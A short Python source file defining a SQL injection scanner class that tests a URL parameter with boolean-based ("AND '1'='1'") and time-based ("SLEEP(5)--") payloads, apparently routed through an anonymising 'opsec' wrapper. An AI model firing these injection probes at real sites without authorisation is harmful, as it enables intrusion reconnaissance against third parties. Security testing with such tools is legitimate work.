import time
class AngelSQL:
    def __init__(self, opsec):
        self.op = opsec
    def boolean_based(self, url, param):
        try:
            r1 = self.op.request(f"{url}?{param}=1 AND '1'='1'")
            r2 = self.op.request(f"{url}?{param}=1 AND '1'='2'")
            if r1.status_code == 200 and r2.status_code != 200:
                return {'vulnerable': True, 'type': 'boolean'}
        except:
            pass
        return {'vulnerable': False}
    def time_based(self, url, param):
        start = time.time()
        try:
            self.op.request(f"{url}?{param}=1 AND SLEEP(5)--", timeout=10)
            if time.time() - start >= 4.5:
                return {'vulnerable': True, 'type': 'time'}
        except:
            pass
        return {'vulnerable': False}
    def full_scan(self, url, param):
        return {
            'target': url,
            'param': param,
            'boolean': self.boolean_based(url, param),
            'time': self.time_based(url, param),
        }
